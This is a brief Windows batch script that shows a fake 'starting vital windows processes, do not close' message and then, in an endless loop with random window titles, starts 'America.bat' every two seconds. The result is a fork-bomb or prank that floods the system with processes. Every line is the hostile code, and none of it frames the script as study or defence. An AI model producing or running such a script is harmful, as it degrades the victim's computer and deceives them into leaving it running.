@echo off
color 0a
echo starting vital windows processes, do not close
pushd "%~dp0
:a
title win%random%a
timeout /t 2 /nobreak >nul
Start America.bat
goto a